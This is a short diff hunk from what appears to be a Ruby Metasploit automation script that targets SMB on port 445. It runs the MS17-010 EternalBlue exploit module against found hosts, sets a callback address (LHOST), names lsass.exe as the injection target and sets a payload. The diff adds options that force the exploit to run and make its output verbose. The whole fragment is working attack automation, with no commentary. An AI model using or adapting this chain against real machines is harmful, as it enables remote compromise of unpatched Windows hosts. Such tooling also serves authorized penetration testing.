@@ -228,6 +228,8 @@
                     run_single("services -c port -S 445 -R")
                     run_single("exploit")
                     run_single("use exploit/windows/smb/ms17_010_eternalblue")
+                    run_single("set VERBOSE true")
+                    run_single("set ForceExploit true")
                     run_single("set LHOST #{local_ip}")
                     run_single("set PROCESSNAME lsass.exe")
                     run_single("set PAYLOAD #{framework.datastore['PAYLOAD']}")
